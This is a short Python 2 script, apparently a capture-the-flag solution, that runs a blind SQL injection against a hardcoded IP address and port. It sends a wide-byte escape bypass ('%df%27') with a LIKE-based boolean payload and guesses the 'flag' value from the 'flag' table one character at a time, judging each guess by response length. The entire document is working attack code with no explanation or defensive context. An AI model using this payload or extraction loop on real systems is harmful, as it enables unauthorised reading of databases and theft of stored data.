#!/usr/bin/env python
# -*- coding: utf-8 -*-

import string
import requests

req = requests.session()
url = "http://218.2.197.235:23733/index.php?key="
payload = "-1%df%27||(select(binary(flag))from(flag))like(0x{}25)%23"
str = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"$\'()*+,-./:;<=>?@[\\]^`{|}~\'"_%'

def get_flag():
    flag=''
    for i in xrange(1,99):
        for c in str:
            char = (flag+c).encode('hex')
            endurl = (url+payload).format(char)
            #print endurl
            r = req.get(endurl)
            if(len(r.text)>1000):
                flag +=c
                print flag
                break
get_flag()
